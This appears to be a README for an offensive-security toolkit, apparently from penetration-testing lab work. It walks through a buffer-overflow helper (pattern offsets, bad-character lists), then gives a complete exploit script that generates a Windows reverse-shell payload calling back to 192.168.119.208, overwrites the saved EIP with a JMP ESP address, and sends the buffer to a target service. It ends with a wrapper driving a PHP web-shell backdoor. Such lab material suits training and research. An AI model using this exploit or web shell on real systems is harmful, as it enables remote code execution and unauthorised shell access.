# tools

## bof.py

Finding the saved EIP offset: pattern creation and offset

```
>>> import bof
>>> pattern = bof.pattern_create(100)
>>> pattern
b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\n'
>>> offset = bof.pattern_offset(pattern, 'Ac5A')
>>> offset
75
>>>
```

Testing for bad characters:

```
>>> import bof
>>> test_characters = bof.generate_bad_characters([0x00, 0x0A, 0x0D])
>>> test_characters
b'\x01\x02\x03\x04\x05\x06\x07\x08\t\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
>>> 
```

Example exploit:

```
#!/usr/bin/python3

import subprocess
import socket
import bof

BUFFER_LENGTH = 2700
PC_OFFSET = 2288
EIP_OVERWRITE = bof.LE_address(0x148010CF) # JMP ESP

sc = bof.msfvenom(r"-p windows/shell_reverse_tcp LHOST=192.168.119.208 LPORT=80 EXITFUNC=process -b '\x00' -e x86/shikata_ga_nai -i 2")

buffer = bof.concatenate([
    b'A' * PC_OFFSET,   # PC Offset
    EIP_OVERWRITE,      # Saved EIP Overwrite
    '#PAD#',            # NOP pad
    sc                  # Shellcode
], length = BUFFER_LENGTH, pad_byte = b'\x90')

assert(len(buffer) == BUFFER_LENGTH)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("192.168.208.10", 7001))
    s.send(buffer)

print("[+] Exploit sent")
```

## webshell-wrapper.sh

```
root@kali:/var/www/html# ./webshell-wrapper.sh 'http://127.0.0.1/simple-backdoor.php?cmd=#CMD#&user=bob'
URL: http://127.0.0.1/simple-backdoor.php?cmd=#CMD#&user=bob
webshell> echo 'Alice says: "Hello, world!"'
Alice says: "Hello, world!"
webshell> 
```
